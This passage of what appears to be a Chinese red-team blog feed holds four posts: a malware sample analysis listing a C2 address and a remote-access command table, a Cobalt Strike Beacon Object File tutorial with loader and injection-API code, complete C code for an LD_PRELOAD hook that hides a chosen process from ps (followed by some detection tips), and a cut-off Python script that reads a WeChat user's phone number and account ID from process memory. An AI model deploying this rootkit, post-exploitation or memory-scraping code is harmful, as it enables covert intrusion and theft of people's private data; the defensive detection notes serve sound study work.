      <link href="/posts/2e79283e.html"/>
      <url>/posts/2e79283e.html</url>
      <content type="html"><![CDATA[<p>原文链接：<br><a href="https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw</a></p><p>微步沙箱：<a href="https://s.threatbook.cn/report/file/8554b5cace52a0fdf0fd3378e4df6606efb45b8ee686ed5b3c1657633405eb85/?sign=history&amp;env=win7_sp1_enx86_office2013" target="_blank" rel="noopener">https://s.threatbook.cn/report/file/8554b5cace52a0fdf0fd3378e4df6606efb45b8ee686ed5b3c1657633405eb85/?sign=history&amp;env=win7_sp1_enx86_office2013</a><br>md5:7f1f7c5c4b6b486e5ba9340944036285<br><img src="https://z3.ax1x.com/2021/08/07/fuOagU.png" alt=""></p><p>执行恶意VBA分析<br>（先调用shoby_leLedr函数）<br><img src="https://z3.ax1x.com/2021/08/07/fuOBDJ.png" alt=""></p><p>释放C:\ProgramData\HDM Media\davivthain.exe和诱饵文件<br><img src="https://z3.ax1x.com/2021/08/07/fuODb9.png" alt=""></p><p>诱饵文件写入<br><img src="https://z3.ax1x.com/2021/08/07/fuOyU1.png" alt=""></p><p>davivthain.exe<br>md5:3c2b45a6d878cc9f30a5dc10abf400a1</p><blockquote><p>检查是否存在C:\Users\geyixian\AppData\Roaming\Microsoft\Windows\Templates\dihakhvartik.zip，存在则将其进行解压并执行<br><img src="https://z3.ax1x.com/2021/08/07/fuOgC6.png" alt=""></p></blockquote><p>若C:\Users\geyixian\AppData\Roaming\Microsoft\Windows\Templates\dihakhvartik.zip不存在，则将创建C:\ProgramData\Hithviwia目录，并通过getWin()函数读取资源数据，并根据操作系统版本选择相应内容保存为trbgertrnion.zip文件，解压执行<br><img src="https://z3.ax1x.com/2021/08/07/fuORgO.png" alt=""></p><p>getShin函数<br>获取操作系统版本，判断“wia07”和“wia08”文件是否存在，若存在则将其删除，然后从资源文件“Resources.data”读取数据保存为data.zip，并解压到C:\Users\geyixian\AppData\Roaming\Microsoft\Windows\Templates，再根据操作系统版本读取相应的文件内容。<br><img src="https://z3.ax1x.com/2021/08/07/fuOWvD.png" alt=""></p><p>drmaiprave.exe<br>md5:77c29d464efcae961424ae050453ef11<br>首先设置开机自启<br><img src="https://z3.ax1x.com/2021/08/07/fuOhKe.png" alt=""></p><p>完成初始化操作之后便开始与C2通信<br>（C2 IP:66.154.112.206 PORT:6188，如果端口连接失败从数组元素挨个测试）<br><img src="https://z3.ax1x.com/2021/08/07/fuO4DH.png" alt=""></p><p>IP解码<br><img src="https://z3.ax1x.com/2021/08/07/fuO5bd.png" alt=""><br><img src="https://z3.ax1x.com/2021/08/07/fuOoVA.png" alt=""></p><p>c2对应的指令解析<br><img src="https://z3.ax1x.com/2021/08/07/fuO75t.png" alt=""></p><p>c2指令   对应函数       操作<br>gey7tavs machine_procss 进程枚举<br>thy7umb  images_details GIF录制<br>pry7ocl  save_apps      开机自启注册表添加<br>doy7wf   download_file  文件保存<br>scy7rsz  dsk_scrn_size  设置截屏大小<br>fiy7lsz     ile_details    文件详情获取<br>csy7dcrgn seye_scren    屏幕截图<br>diy7rs    show_send_drives 硬盘数量枚举<br>dey7lt    tras_files     文件删除<br>afy7ile   seynd_auto    文件上传<br>udy7lt    remove_account 当前路径保存名为iaknhan.exe并运行<br>liy7stf   see_folders   文件夹遍历获取目录下的文件名（包括文件详细信息获取）<br>iny7fo    account_infos 系统版本号和当前进程所在路径获取<br>ruy7nf    Process.Start(procss_type[1].Split(new char[]{‘&gt;’})[0]);  运行指定进程<br>fiy7le    move_files    文件移动<br>fly7es    see_files     文件夹遍历获取文件名</p><p><img src="https://z3.ax1x.com/2021/08/07/fuObPP.png" alt=""></p><p>原文链接：<br><a href="https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw</a></p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CS 4.1 BOF开发</title>
      <link href="/posts/e42bb01c.html"/>
      <url>/posts/e42bb01c.html</url>
      <content type="html"><![CDATA[<h2 id="BOF介绍"><a href="#BOF介绍" class="headerlink" title="BOF介绍"></a>BOF介绍</h2><p>信标对象文件 (BOF) 是一个已编译的 C 程序，按照约定编写，允许它在信标进程中执行并使用内部信标 API。BOF 是一种使用新的后开发功能快速扩展 Beacon 代理的方法。</p><h2 id="BOF是如何执行的"><a href="#BOF是如何执行的" class="headerlink" title="BOF是如何执行的"></a>BOF是如何执行的</h2><p>对于 Beacon 来说，BOF 只是一个位置无关的代码块，它接收指向某些 Beacon 内部 API 的指针。<br>对于 Cobalt Strike 而言，BOF 是由 C 编译器生成的目标文件。Cobalt Strike 解析此文件并充当其内容的链接器和加载器。这种方法允许您编写与位置无关的代码，用于 Beacon，而无需繁琐的体操来管理字符串和动态调用 Win32 API。</p><h2 id="BOF缺陷"><a href="#BOF缺陷" class="headerlink" title="BOF缺陷"></a>BOF缺陷</h2><ol><li>BOF 是调用 Win32 API 和有限 Beacon API 的单文件 C 程序。不要期望使用此机制链接其他功能或构建大型项目。</li><li>Cobalt Strike 不会将您的 BOF 链接到 libc。这意味着您仅限于编译器内部函数（例如，Visual Studio 上的 __stosb for memset）、公开的 Beacon 内部 API、Win32 API 以及您编写的函数。您可能无法通过 BOF 使用许多常用函数（例如 strlen、stcmp 等）。</li><li>BOF 在您的 Beacon 代理内部执行。如果 BOF 崩溃，有可能导致Beacon崩溃</li><li>Cobalt Strike 期望您的 BOF 是短时间运行的单线程程序。BOF 将阻止其他 Beacon 任务和功能的执行。异步或长时间运行的任务没有 BOF<br>模式。如果要构建长时间运行的功能，请考虑在牺牲进程内运行的反射 DLL。</li></ol><p>编译的方式</p><pre><code>要使用 Visual Studio 编译它：cl.exe /c /GS- hello.c /Fohello.o要使用 x86 MinGW 编译它：i686-w64-mingw32-gcc -c hello.c -o hello.o要使用 x64 MinGW 编译它：x86_64-w64-mingw32-gcc -c hello.c -o hello.o</code></pre><p>x64 beacon对应加载x64 gcc编译的bof文件，x86 beacon对应加载x86 gcc编译的bof文件</p><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><pre><code>* cs 4.1或者以上的版本* 从官方下载beacon.h -&gt; https://www.cobaltstrike.com/downloads/beacon.h</code></pre><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>cna主要使用的几个函数和过程：<br>先了解几个函数：</p><pre><code>* bof_pack - 打包参数传入到BOF里的函数* beacon_inline_execute - 调用BOF里面的函数</code></pre><p><strong>bof_pack</strong><br>$1 - Beacon ID<br>$2 - 打包数据的格式化字符串 -&gt; (例如Socket里的Packet操作)</p><pre><code>此函数将其参数打包成一个二进制结构，以便与&amp;beacon_inline_execute一起使用。此处的格式字符串选项对应于 BOF 文件可用的 BeaconData* C API。该 API 根据它可以打包的每种类型的要求处理数据和提示的转换。</code></pre><p>文档链接：<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#bof_pack" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/functions.html#bof_pack</a></p><p><strong>beacon_inline_execute</strong><br>$1 - Beacon ID<br>$2 - 读取了BOF文件的数据<br>$3 - 要调用的函数名称<br>$4 - 要传递给BOF文件的打包参数</p><pre><code>执行信标对象文件</code></pre><p>文档链接：<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#beacon_inline_execute" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/functions.html#beacon_inline_execute</a></p><p>BOF文件示例（有参数调用，无Windows API调用）:</p><pre><code class="C">#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tlhelp32.h&gt;#include &quot;beacon.h&quot;void demo(char * args, int length) {    datap  parser; #参数结构定义    char * str_arg;    int    num_arg;    BeaconDataParse(&amp;parser, args, length); #准备数据解析器以从指定缓冲区中提取参数    str_arg = BeaconDataExtract(&amp;parser, NULL); #参数解析赋值于str_arg对应bof_pack函数参数2里的格式化字符串z    num_arg = BeaconDataInt(&amp;parser); #参数解析赋值于num_arg对应bof_pack函数参数2里的格式化字符串i    BeaconPrintf(CALLBACK_OUTPUT, &quot;Message is %s with %d arg&quot;, str_arg, num_arg);}</code></pre><p>cna文件示例：<br>cna调用BOF文件函数过程：</p><pre><code>* 先读取bof文件内容* 调用的函数是否需要参数* 调用函数入口点</code></pre><pre><code>alias hello {    btask($1, script_resource(&quot;demo.o&quot;));    $handle = openf(script_resource(&quot;demo.o&quot;)); #读取BOF文件    $data   = readb($handle, -1); #读取BOF文件内容    closef($handle);    $args = bof_pack($1, &quot;zi&quot;, &quot;Raiden Mei Birthday&quot;, 413); #参数打包    btask($1, &quot;Running Hello BOF&quot;);    beacon_inline_execute($1, $data, &quot;demo&quot;, $args); #调用BOF文件入口点}</code></pre><p>效果如下:<br><img src="https://z3.ax1x.com/2021/07/28/W7sow9.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/07/28/W7yBp6.png" alt=""></p><p>调用Windows API<br>下载<a href="https://github.com/dtmsecurity/bof_helper，执行输入API转换获取BOF里的格式" target="_blank" rel="noopener">https://github.com/dtmsecurity/bof_helper，执行输入API转换获取BOF里的格式</a><br>（自己测试的时候获取失败了，不过看了一下人手转BOF格式也可以）</p><pre><code>python3 bof_helper.py DsGetDcNameA██████╗  ██████╗ ███████╗██╔══██╗██╔═══██╗██╔════╝██████╔╝██║   ██║█████╗██╔══██╗██║   ██║██╔══╝██████╔╝╚██████╔╝██║╚═════╝  ╚═════╝ ╚═╝BOF Helper by @dtmsecurity[Library] DsGetDcNameA is probably in NetApi32[Declaration] DWORD WINAPI DsGetDcNameA(LPCSTR, LPCSTR, GUID*, LPCSTR, ULONG, PDOMAIN_CONTROLLER_INFOA*);[BOF Helper]DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameA(LPCSTR, LPCSTR, GUID*, LPCSTR, ULONG, PDOMAIN_CONTROLLER_INFOA*);</code></pre><p><img src="https://z3.ax1x.com/2021/07/28/W7yojS.png" alt=""></p><p>例如CreateProcessA</p><pre><code>BOOL CreateProcessA(  LPCSTR                lpApplicationName,  LPSTR                 lpCommandLine,  LPSECURITY_ATTRIBUTES lpProcessAttributes,  LPSECURITY_ATTRIBUTES lpThreadAttributes,  BOOL                  bInheritHandles,  DWORD                 dwCreationFlags,  LPVOID                lpEnvironment,  LPCSTR                lpCurrentDirectory,  LPSTARTUPINFOA        lpStartupInfo,  LPPROCESS_INFORMATION lpProcessInformation);</code></pre><p>到了BOF就变成这样<br>DECLSPEC_IMPORT WINBASEAPI &lt;类型&gt; &lt;API类型&gt; DLL名$&lt;从DLL里面导出的API名称&gt;</p><pre><code>DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(  LPCSTR                lpApplicationName,  LPSTR                 lpCommandLine,  LPSECURITY_ATTRIBUTES lpProcessAttributes,  LPSECURITY_ATTRIBUTES lpThreadAttributes,  BOOL                  bInheritHandles,  DWORD                 dwCreationFlags,  LPVOID                lpEnvironment,  LPCSTR                lpCurrentDirectory,  LPSTARTUPINFOA        lpStartupInfo,  LPPROCESS_INFORMATION lpProcessInformation);</code></pre><p>更多示例</p><pre><code>DECLSPEC_IMPORT WINBASEAPI void * __cdecl MSVCRT$memset(void *_Dst,int _Val,size_t _Size);DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$CreateProcessA (LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, WINBOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$QueueUserAPC (PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread (HANDLE hThread);</code></pre><p>demo2.c （无参数，windows API调用）</p><pre><code class="C">#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tlhelp32.h&gt;#include &quot;beacon.h&quot;DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(  LPCSTR                lpApplicationName,  LPSTR                 lpCommandLine,  LPSECURITY_ATTRIBUTES lpProcessAttributes,  LPSECURITY_ATTRIBUTES lpThreadAttributes,  BOOL                  bInheritHandles,  DWORD                 dwCreationFlags,  LPVOID                lpEnvironment,  LPCSTR                lpCurrentDirectory,  LPSTARTUPINFOA        lpStartupInfo,  LPPROCESS_INFORMATION lpProcessInformation);void demo(char * args, int length) {    STARTUPINFOA si = { 0 };    si.cb = sizeof(si);    PROCESS_INFORMATION pi = { 0 };    BOOL Test = KERNEL32$CreateProcessA(NULL, &quot;C:\\Windows\\System32\\notepad.exe&quot;, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &amp;si, &amp;pi);}</code></pre><p>demo.cna</p><pre><code>alias hello {    btask($1, script_resource(&quot;demo2.o&quot;));    $handle = openf(script_resource(&quot;demo2.o&quot;));    $data   = readb($handle, -1);    closef($handle);    $args = bof_pack($1, &quot;zi&quot;, &quot;&quot;, 0);    btask($1, &quot;Running Hello BOF&quot;);    beacon_inline_execute($1, $data, &quot;demo&quot;, $args);}</code></pre><p><img src="https://z3.ax1x.com/2021/07/28/W7yv90.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cobaltstrike.com/help-beacon-object-files" target="_blank" rel="noopener">https://www.cobaltstrike.com/help-beacon-object-files</a><br><a href="https://www.cobaltstrike.com/aggressor-script/functions.html" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/functions.html</a><br><a href="http://evilash.me/2020/08/18/BOF.html" target="_blank" rel="noopener">http://evilash.me/2020/08/18/BOF.html</a><br><a href="https://github.com/boku7/HOLLOW/blob/main/hollow.x64.c" target="_blank" rel="noopener">https://github.com/boku7/HOLLOW/blob/main/hollow.x64.c</a> - 这个例子不错</p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux 通过LD_PRELOAD实现进程隐藏</title>
      <link href="/posts/906527f2.html"/>
      <url>/posts/906527f2.html</url>
      <content type="html"><![CDATA[<h2 id="LD-PRELOAD介绍"><a href="#LD-PRELOAD介绍" class="headerlink" title="LD_PRELOAD介绍"></a>LD_PRELOAD介绍</h2><p>好问题！实际上，/etc/ld.so.preload在某种程度上取代了LD_PRELOAD。<br>由于安全问题，LD_PRELOAD受到严格限制：它不能执行任意setuid二进制文件，因为如果可以，您可以用您自己的恶意代码替换库例程，例如参见此处的一个很好的讨论。事实上，你可以在ld.so’user manual 中阅读：</p><blockquote><p>LD_PRELOAD 要在所有其他库之前加载的附加、用户指定的 ELF 共享库列表。列表的项目可以用空格或冒号分隔。这可用于选择性地覆盖其他共享库中的函数。使用描述下给出的规则搜索库。对于 set-user-ID/set-group-ID ELF 二进制文件，包含斜杠的预加载路径名将被忽略，并且只有在库文件上启用了 set-user-ID 权限位时才会加载标准搜索目录中的库。<br>相反，文件/etc/ld.so.preload没有这样的限制，这个想法是，如果你可以读/写目录/etc，你已经拥有 root 凭据。因此它的使用。请记住，您可以使用/etc/ld.so.preload即使您一开始似乎没有：它只是glibc 的一个特性，因此是所有 Linux 发行版的一个特性（但不是，最好的我对 Unix 风格的了解），因此您可以创建它并将任何Linux 发行版中的任何setuid 库的名称放入其中，它就会起作用。</p></blockquote><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p><img src="https://z3.ax1x.com/2021/07/26/WfYGh6.png" alt=""><br>（也不知道这两个函数怎么知道是系统调用抽出来的）</p><p>ps命令获取进程过程：</p><pre><code>* openat打开/proc/&lt;pid&gt;/&lt;file&gt;* read读取* write输出</code></pre><p>通过执行<code>strace -f ps -elf 2&gt;&amp;1</code>即可得出结论<br><img src="https://z3.ax1x.com/2021/07/26/WfYo40.png" alt=""></p><p>上面那个github的原理就是hook了readdir。github上面那个通过利用循环里的continue跳过匹配的进程返回，但是会造成bug，稍微修改了一下，最终结果如下</p><pre><code class="C">#define _GNU_SOURCE#include &lt;dirent.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;static int get_dir_name(DIR* dirp, char* buf, size_t size){    int fd = dirfd(dirp); //获取目录流文件描述符    if(fd == -1) {        return 0;    }    char tmp[64];    snprintf(tmp, sizeof(tmp), &quot;/proc/self/fd/%d&quot;, fd); //拼接路径得到目录流文件路径    ssize_t ret = readlink(tmp, buf, size); //读取符号链接的值 (读取链接的目录)    if(ret == -1) {        return 0;    }    buf[ret] = 0;    return 1;}static int get_process_name(char* pid, char* buf){    if(strspn(pid, &quot;0123456789&quot;) != strlen(pid)) { //枚举出PID目录        return 0;    }    char tmp[256];    snprintf(tmp, sizeof(tmp), &quot;/proc/%s/stat&quot;, pid); //拼接得到/porc/&lt;pid&gt;/stat文件路径    FILE* f = fopen(tmp, &quot;r&quot;);    if(f == NULL) {        return 0;    }    if(fgets(tmp, sizeof(tmp), f) == NULL) {        fclose(f);        return 0;    }    fclose(f);    int unused;    sscanf(tmp, &quot;%d (%[^)]s&quot;, &amp;unused, buf); //读取完/porc/&lt;pid&gt;/stat文件内容匹配出进程名称    return 1;}static struct dirent* (*original_readdir)(DIR*) = NULL; //构造readdir函数原型 https://linux.die.net/man/3/readdirstatic const char* process_to_filter = &quot;ruby&quot;; //需要被隐藏的进程名称struct dirent *readdir(DIR *dirp){        if(original_readdir == NULL) {                original_readdir = dlsym(RTLD_NEXT, &quot;readdir&quot;); //通过dlsym来获取readdir函数地址                if(original_readdir==NULL){                        printf(&quot;readdir Address Get Failure,Error Code:%d\n&quot;,dlerror());                }        }        struct dirent* dp;        dp=original_readdir(dirp); //通过调用readdir函数读取目录        char dirname[256];        char processname[256];        get_dir_name(dirp,dirname,sizeof(dirname)); //获取当前所在目录        if(strcmp(dirname,&quot;/proc&quot;)==0){ //目录文件等于/proc                get_process_name(dp-&gt;d_name,processname);  //由于目录文件是/proc，那么文件名(d_name)肯定是pid，所以获取要打开的文件名                if(strcmp(processname,process_to_filter)==0){ //当进程名称符合要屏蔽的进程名不返回                }else{                        return dp;                }        }}</code></pre><p>while循环continue屏蔽</p><pre><code class="C">#define _GNU_SOURCE#include &lt;dirent.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;static int get_dir_name(DIR* dirp, char* buf, size_t size){    int fd = dirfd(dirp);    if(fd == -1) {        return 0;    }    char tmp[64];    snprintf(tmp, sizeof(tmp), &quot;/proc/self/fd/%d&quot;, fd);    ssize_t ret = readlink(tmp, buf, size);    if(ret == -1) {        return 0;    }    buf[ret] = 0;    return 1;}static int get_process_name(char* pid, char* buf){    if(strspn(pid, &quot;0123456789&quot;) != strlen(pid)) {        return 0;    }    char tmp[256];    snprintf(tmp, sizeof(tmp), &quot;/proc/%s/stat&quot;, pid);    FILE* f = fopen(tmp, &quot;r&quot;);    if(f == NULL) {        return 0;    }    if(fgets(tmp, sizeof(tmp), f) == NULL) {        fclose(f);        return 0;    }    fclose(f);    int unused;    sscanf(tmp, &quot;%d (%[^)]s&quot;, &amp;unused, buf);    return 1;}#define DECLARE_READDIR(dirent, readdir)static struct dirent* (*original_readdir)(DIR*) = NULL;static const char* process_to_filter = &quot;ruby&quot;;struct dirent *readdir(DIR *dirp){        if(original_readdir == NULL) {                original_readdir = dlsym(RTLD_NEXT, &quot;readdir&quot;);                if(original_readdir==NULL){                        printf(&quot;readdir Address Get Failure,Error Code:%d\n&quot;,dlerror());                }        }        struct dirent* dp;        while(1){                dp=original_readdir(dirp);                char dirname[256];                char processname[256];                get_dir_name(dirp,dirname,sizeof(dirname));                if(strcmp(dirname,&quot;/proc&quot;)==0){                        get_process_name(dp-&gt;d_name,processname);                        if(strcmp(processname,process_to_filter)==0){                                continue;                        }                }                break;        }        return dp;}</code></pre><p>静态编译:<br><code>gcc -shared -fpic example.c -o example.so</code><br><code>LD_PRELOAD=/home/kali/Desktop/example.so /usr/bin/ps -elf</code> #指定程序使用</p><p>从这些code里面可以明白写LD HOOK的时候，需准备以下操作：</p><pre><code>* 被HOOK的目标函数是否通过libc抽象出来调用的，比如说getuid这种就不是。C原生的，非C原生的都要HOOK C原生函数* 实例化被HOOK函数原型* 通过dlsym寻找被HOOK原函数的地址，赋予定义的函数原型变量* 调用原函数获取内容，判断后是否要return</code></pre><p>PS:最好还是用while continue屏蔽</p><p><img src="https://z3.ax1x.com/2021/07/26/Wftm5t.png" alt=""></p><h2 id="etc-ld-so-preload测试的问题"><a href="#etc-ld-so-preload测试的问题" class="headerlink" title="/etc/ld.so.preload测试的问题"></a>/etc/ld.so.preload测试的问题</h2><p>使用了/etc/ld.so.preload (最好不要用，由于是全局使用容易出现大规模的问题) -&gt; 匹配到不是进程名称的就return返回<br><img src="https://z3.ax1x.com/2021/07/26/WftBMF.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/26/WfsYOx.png" alt=""><br>（测试遇到这个问题先删除so，在删除/etc/ld.so.preload）</p><p>while循环continue虽然可以避免这个问题，但是执行ps的时候会出现bug<br><img src="https://z3.ax1x.com/2021/07/26/WfswkD.png" alt=""></p><p>防止这种操作蒙蔽双眼：<br>I、检查LD_PRELOAD环境变量是否有异常<br>II、检查ld.so.preload 等配置文件是否有异常<br>III、自己写个python小工具，直接读取/proc中的内容，对于ps等工具的结果，对不上，则存在被劫持可能<br>IV、使用sysdig（有开源版，可以监控ps等的调用过程，观察是否有恶意动态库被加载。strace有类似功能）或者prochunter（google 上search）<br>sysdig proc.name=ps or strace -f ps -elf 2&gt;&amp;1</p><p>遍历/poc目录，获取进程PID。读取/proc/<pid>/stat文件 -&gt; 读取/proc/<pid>/cmdline得到要执行的命令行参数</pid></pid></p><pre><code class="python">import osdef getprocess():    path=os.listdir(&quot;/proc&quot;)    for p in path:        tmplen=0        for n in range(0,10):            for c in p:                if c==str(n):                    tmplen+=1        if len(p)==tmplen:            print(&quot;------PID:{}-----&quot;.format(p))            print(open(&quot;/proc/{}/stat&quot;.format(p),&quot;r&quot;).read())            print(open(&quot;/proc/{}/cmdline&quot;.format(p),&quot;r&quot;).read())getprocess()</code></pre><p><img src="https://z3.ax1x.com/2021/07/26/WfaEb4.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://linux.die.net/man/3/readdir" target="_blank" rel="noopener">https://linux.die.net/man/3/readdir</a><br><a href="https://pubs.opengroup.org/onlinepubs/007904875/functions/readdir_r.html" target="_blank" rel="noopener">https://pubs.opengroup.org/onlinepubs/007904875/functions/readdir_r.html</a><br><a href="https://techoverflow.net/2019/06/20/how-to-fix-c-error-rtld_next-undeclared/" target="_blank" rel="noopener">https://techoverflow.net/2019/06/20/how-to-fix-c-error-rtld_next-undeclared/</a><br><a href="https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/" target="_blank" rel="noopener">https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/</a><br><a href="https://github.com/gianlucaborello/libprocesshider" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider</a><br>现成工具:<a href="https://github.com/gianlucaborello/libprocesshider" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider</a><br>原理文章:<a href="https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/" target="_blank" rel="noopener">https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/</a></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>读取微信内存里的信息</title>
      <link href="/posts/26c63b49.html"/>
      <url>/posts/26c63b49.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接:<a href="https://blog.csdn.net/weixin_30230009/article/details/105100181" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30230009/article/details/105100181</a><br>需要了解知识：<br>基址 -&gt; 基址在程序下次运行时是不会改变的<br>-&gt;每次重启进程，模块加载的地址会变</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>寻找对应的信息基本方法如下:<br>打开CE附加微信进程，搜索微信号等关键字，然后找到基址 （绿色的就是），双击添加到地址列表<br><img src="https://z3.ax1x.com/2021/07/21/WU1snP.png" alt=""></p><p>PS：这里重启了几次wx，所以CE里的地址和上图对不上 (一开始忘记截了)<br>对着地址双击就能看到对应的地址<br><img src="https://z3.ax1x.com/2021/07/21/WU1y0f.png" alt=""></p><p>然后OD定位到对应的内存地址去查询<br>command: dd <address><br>可以看到开头就是微信号 （打码的手机号）等信息<br><img src="https://z3.ax1x.com/2021/07/21/WU1678.png" alt=""></address></p><p>我们只需要知道基址然后：模块加载地址+基址</p><p>怎么求基址-&gt;偏移地址-dll加载地址=基址<br>这里求手机号基址为例，在od鼠标在内存窗口单机刚刚找到的那个地址点击手机号第一个数字，然后记录下地址，在CE手动添加地址里面输入，类型选字符串<br>即可看见手机号（手机号长度11所以长度设置11）<br><img src="https://z3.ax1x.com/2021/07/21/WU1h1s.png" alt=""></p><p>dll加载地址，CE点击手动添加地址，输入dll名称，类型选4字节<br><img src="https://z3.ax1x.com/2021/07/21/WU15Xq.png" alt=""></p><p>然后将数值改为十六进制（即可得到地址）<br><img src="https://z3.ax1x.com/2021/07/21/WU1TBV.png" alt=""></p><p>或者你也可以用OD或者Process Explorer里获取加载dll地址<br>（注：这后面截的图与上方地址对不上）<br><img src="https://z3.ax1x.com/2021/07/21/WU177T.png" alt=""></p><p>求出手机号基址<br>53D0F560:手机号内存地址<br>52CC0000:dll加载地址<br>53D0F560-52CC0000=104F560 -&gt; WeChatWin.dll(52CC0000)+104F560=手机号<br><img src="https://z3.ax1x.com/2021/07/21/WU1qNF.png" alt=""></p><p>所以以此类推获取：微信号、微信名称等基址<br>WeChatWin.dll+104F52C - wx名<br>WeChatWin.dll+104F690 - wx号地址<br>WeChatWin.dll+104F560 - 手机号</p><p>（找到信息的时候可以切成地址，然后往下滑）<br><img src="https://z3.ax1x.com/2021/07/21/WU1X9J.png" alt=""></p><p>注意事项：遇到指针的话，先获取指针里的值。然后在用这个值当作地址找<br>在找wx号的时候就遇到了<br>（算出第一个基址后，求别的时候只需要把后面三个数字给替换掉就知道了,emmmmmm）<br><img src="https://z3.ax1x.com/2021/07/21/WU1vcR.png" alt=""></p><p>此时046F35D0里面的地址放着微信号<br>（PS:这里地址微信重启过，和上面的图地址对不上）<br><img src="https://z3.ax1x.com/2021/07/21/WU3Snx.png" alt=""></p><p>构造读取<br>使用的Windows API:OpenProcess、ReadProcessMemory</p><pre><code class="python">from ctypes import *from win32con import *from ctypes.wintypes import *from win32process import (EnumProcessModules,GetModuleFileNameEx)import osCreateToolhelp32Snapshot=windll.Kernel32.CreateToolhelp32SnapshotProcess32First=windll.kernel32.Process32FirstProcess32Next=windll.kernel32.Process32NextOpenProcess = windll.kernel32.OpenProcessReadProcessMemory = windll.kernel32.ReadProcessMemoryCloseHandle = windll.kernel32.CloseHandleTH32CS_SNAPPROCESS=0x00000002TH32CS_SNAPMODULE = 0x00000008MAX_MODULE_NAME32 = 255class PROCESSENTRY32A(Structure): #定义PROCESSENTRY32A类型    _fields_ = [ ( &#39;dwSize&#39; , c_ulong ) ,                 ( &#39;cntUsage&#39; , c_ulong) ,                 ( &#39;th32ProcessID&#39; , c_ulong) ,                 ( &#39;th32DefaultHeapID&#39; , c_size_t) ,                 ( &#39;th32ModuleID&#39; , c_ulong) ,                 ( &#39;cntThreads&#39; , c_ulong) ,                 ( &#39;th32ParentProcessID&#39; , c_ulong) ,                 ( &#39;pcPriClassBase&#39; , c_long) ,                 ( &#39;dwFlags&#39; , c_ulong) ,                 ( &#39;szExeFile&#39; , c_char * MAX_PATH ) ]def getprocess_pid(processname):    processimage=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0)    pe32=PROCESSENTRY32A()    pe32.dwSize=sizeof(PROCESSENTRY32A)    ret=Process32First(processimage,pointer(pe32))    while ret:        if pe32.szExeFile.decode()==processname:            return pe32.th32ProcessID        ret=Process32Next(processimage,pointer(pe32))def getmodule_address(handle,dllname):    for module in EnumProcessModules(handle):        dllpath=GetModuleFileNameEx(handle,module)        print(module,dllpath)def main():    wetchatwindlladdress=0x63B60000 #枚举WetChatWin.dll加载地址失败，就直接手动定义了    phome = create_string_buffer(11)    wxname=create_string_buffer(20)    wxnumber=c_int(20)    number=create_string_buffer(20)    pid=getprocess_pid(&quot;WeChatStore.exe&quot;)    print(&quot;WeChat PID:{}&quot;.format(pid))    process=OpenProcess(PROCESS_ALL_ACCESS,False,pid)    